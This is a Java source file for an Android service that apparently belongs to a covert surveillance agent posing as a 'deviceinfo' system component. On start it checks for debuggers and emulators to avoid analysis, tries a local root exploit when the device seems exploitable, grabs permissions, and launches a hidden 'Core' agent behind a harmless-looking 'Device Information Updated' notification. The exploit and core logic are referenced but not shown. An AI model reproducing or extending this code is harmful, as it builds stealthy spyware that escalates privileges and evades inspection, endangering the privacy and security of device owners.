package com.android.deviceinfo;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.res.Configuration;
import android.os.IBinder;
import android.widget.Toast;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.util.Check;
import com.android.m.M;

/**
 * The Class ServiceCore.
 */
public class ServiceMain extends Service {
	private static final String TAG = "ServiceCore"; //$NON-NLS-1$
	private boolean needsNotification = false;
	private Core core;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();

		Status.setAppContext(getApplicationContext());
		
		// ANTIDEBUG ANTIEMU
		if (!Core.checkStatic()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onCreate) anti emu/debug failed");
			}
			return;
		}

		//M.init(getApplicationContext());

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, M.e("Agent Created"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}

		// TODO: verificare che needsNotification serva.
		needsNotification = false; // Root.isNotificationNeeded();

		// E' sempre false se Cfg.ACTIVITY = false
		if (needsNotification == true) {
			Notification note = new Notification(R.drawable.notify_icon, "Device Information Updated",
					System.currentTimeMillis());

			Intent i = new Intent(this, LocalActivity.class);

			i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);

			PendingIntent pi = PendingIntent.getActivity(this, 0, i, 0);

			// Activity Name and Displayed Text
			note.flags |= Notification.FLAG_AUTO_CANCEL;
			note.setLatestEventInfo(this, "", "", pi);

			startForeground(1260, note);
		}
	}

	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onStart)"); //$NON-NLS-1$
		}

		// ANTIDEBUG ANTIEMU
		if (Core.checkStatic()) {
			if (Root.isRootShellInstalled() == false && Root.checkExploitability()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onStart): Device seems locally exploitable"); //$NON-NLS-1$
				}
				
				Root.localExploit();
			}
			
			Root.getPermissions();

			// Core starts
			core = Core.newCore(this);
			core.Start(this.getResources(), getContentResolver());
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onStart) anti emu/debug failed");
				Toast.makeText(Status.getAppContext(), M.e("Debug Failed!"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
			}
		}
	}

	@Override
	public void onConfigurationChanged(Configuration newConfig) {
		super.onConfigurationChanged(newConfig);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onConfigurationChanged)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, M.e("(onConfigurationChanged)"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}
	}

	@Override
	public void onLowMemory() {
		super.onLowMemory();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onLowMemory)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, M.e("(onLowMemory)"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}
	}

	@Override
	public void onRebind(Intent intent) {
		super.onRebind(intent);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onRebind)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, M.e("(onRebind)"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}
	}

	@Override
	public boolean onUnbind(Intent intent) {
		boolean ret = super.onUnbind(intent);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onUnbind)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, M.e("(onUnbind)"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}

		return ret;
	}

	@Override
	public void onDestroy() {
		super.onDestroy();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onDestroy)"); //$NON-NLS-1$
		}

		if (Cfg.DEMO) {
			Toast.makeText(this, M.e("Agent Destroyed"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
		}

		core.Stop();
		core = null;

		if (needsNotification == true) {
			stopForeground(true);
		}
	}

}
